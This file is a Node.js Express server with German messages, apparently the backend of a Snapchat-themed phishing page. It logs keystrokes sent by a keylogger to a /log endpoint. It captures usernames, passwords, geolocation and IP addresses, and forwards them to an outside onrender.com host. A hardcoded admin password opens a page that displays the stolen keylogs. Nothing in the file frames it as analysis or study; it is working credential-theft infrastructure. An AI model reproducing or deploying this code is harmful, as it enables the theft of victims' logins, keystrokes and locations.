const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

app.post('/log', (req, res) => {
    const encryptedData = req.body.data;
    const logPath = path.join(__dirname, 'private_logs', 'keylog.txt');

    if (!fs.existsSync(path.dirname(logPath))) {
        fs.mkdirSync(path.dirname(logPath), { recursive: true });
    }
  
    try {
        const decoded = decodeURIComponent(atob(encryptedData));
        fs.appendFileSync(logPath, `${new Date().toISOString()} | ${decoded}\n`);
        res.status(204).end();
    } catch (err) {
        console.error("⚠️ Keylogger-Fehler:", err);
        res.status(400).end();
    }
});

app.post('/submit', async (req, res) => {
  try {
    const { username, password, latitude, longitude } = req.body;

    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const logData = {
      timestamp: new Date().toISOString(),
      ip: clientIp,
      userAgent: req.headers['user-agent'],
      username,
      password,
      latitude,
      longitude
     };

    fs.appendFile('submissions.log', JSON.stringify(logData) + '\n', (err) => {
      if (err) console.error("Log-Fehler:", err);
    });
    
    console.log("👤 Benutzername:", username);
    console.log("🔑 Passwort:", password);
    console.log("📍 Standort:", latitude, longitude);
    console.log("📍 IP:", clientIp);

    await fetch('https://snapchat-usvu.onrender.com/submit', {
      method: 'POST',
        headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(logData)
    });

    res.redirect('/danke.html');
  } catch (error) {
    console.error("❌ Fehler:", error);
    res.status(500).send("Serverfehler");
  }
});

const ADMIN_PASSWORD = "Cryptoking2025!"; 

app.get('/admin', (req, res) => {
    const auth = req.query.password;
    if (auth !== ADMIN_PASSWORD) {
        return res.status(403).send("Zugriff verweigert.");
    }

    try {
        const logs = fs.readFileSync(path.join(__dirname, 'private_logs', 'keylog.txt'), 'utf-8');
        res.send(`
            <!DOCTYPE html>
            <html>
            <head>
                <title>Admin-Logs</title>
                <style>
                    body { font-family: Arial; padding: 20px; }
                    pre { background: #111; color: #0f0; padding: 10px; border-radius: 5px; }
                </style>
            </head>
            <body>
                <h1>Keylogger-Logs</h1>
                <pre>${logs.replace(/</g, "&lt;")}</pre> <!-- XSS-Sicher -->
            </body>
            </html>
        `);
    } catch (err) {
        res.send("Keine Logs gefunden.");
    }
});

app.listen(PORT, () => {
  console.log(`✅ Server läuft auf http://localhost:${PORT}`);
});
